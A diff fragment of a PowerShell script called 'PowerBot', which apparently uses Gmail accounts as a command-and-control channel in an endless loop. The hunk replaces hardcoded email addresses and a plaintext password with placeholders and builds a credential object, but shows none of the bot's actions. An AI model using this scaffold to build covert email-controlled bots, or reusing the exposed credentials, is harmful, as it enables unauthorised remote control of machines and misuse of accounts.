@@ -2,11 +2,11 @@ function PowerBot {
 
     while ($true){
 
-    $Control = 'powershelldb@gmail.com'
-    $Client = 'powershellbd@gmail.com'
+    $Control = 'control@gmail.com'
+    $Client = 'client@gmail.com'
     $Subject = 'PowerBot'
-    $Username = 'powershellbd@gmail.com'
-    $Password = 'Powershell'
+    $Username = 'control@gmail.com'
+    $Password = 'P4ssw0rd'
 
     $SecureString = ConvertTo-SecureString $Password -AsPlainText -Force
     $credentials = New-Object System.Management.Automation.PSCredential $Username,$SecureString
